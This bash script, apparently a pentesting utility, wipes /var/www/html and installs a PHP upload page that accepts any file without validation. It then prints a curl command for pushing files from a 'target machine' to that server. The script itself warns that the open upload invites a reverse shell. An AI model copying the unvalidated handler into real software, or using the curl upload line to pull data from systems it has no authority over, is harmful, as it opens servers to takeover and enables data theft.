#!/bin/bash

user_root_check=$(id -u)
if [ "$user_root_check" != "0" ];
then
        printf -- "This program needs root privilege to run\n"
        exit
fi


function template(){

cat << 'EOF'

<?php
echo '<form action="index.php" method="post" enctype="multipart/form-data">' .
'<input type="file" name="uploadfile">' .
'<input type="submit" value="Upload Image" name="submit">' .
'</form>';

// CREATE DIR IF DOESNT EXIST
$target_dir = "./tmp/";
if (!file_exists($target_dir)) {
mkdir($target_dir);
}

// BUILDIN CONDITIONS
$filename = ($_FILES["uploadfile"]["name"]);
$target_file = $target_dir . $filename;


if (move_uploaded_file($_FILES["uploadfile"]["tmp_name"], $target_file)) {
        echo "The file ". $filename . " has been uploaded.";
    } else {
        echo "Sorry, there was an error uploading your file.";
        die();
    }
?>

EOF

}

printf -- "\e[1;31m[!] WARNING [!]\e[0m\nIs not recommended leave the server opened for a long time\nbecause index.php template doesnt contains any validation\n\n"
printf -- "That means \e[4msince you open the server you leave a breach, everybody can upload EVERYTHING\n"
printf -- "Yeah, that includes a reverse shell against you!!!\nSO WATCHOUT WHAT YOU DO!\e[0m\n"
printf -- "\e[0;32m"
template
printf -- "\e[0m"

printf -- "\e[1;31m[!] WARNING [!]\e[0m\nTo execute this script is necessary clean your /var/www/html folder\nRecommended make a backup of your folder before continue\n"
printf -- "or you will LOSE the files of that directory\n\nType y to execute: "

read -p "" option
if [ "$option" == "y" ];
then
	printf -- "\nRemoving files inside /var/www/html\n"
	rm -r /var/www/html/* 2>/dev/null
	printf -- "Creating folder /var/www/html/tmp\n"
	mkdir -p /var/www/html/tmp 2>/dev/null

	printf "Creating index.php file in /var/www/html/\n"
	template > /var/www/html/index.php

	printf -- "Setting permissions\n"
	chown www-data:www-data /var/www/html/tmp
	chown www-data:www-data /var/www/html/*
	printf -- "Done!\n"
	printf -- "\n[\e[0;32m+\e[0m] Starting Apache server\n\n"
	sudo service apache2 start
	printf -- "Type in target machine: curl -F 'uploadfile=@/path/of/file.txt' [myserver]/index.php\n"

else
	printf "\nExiting\n"
	exit
fi
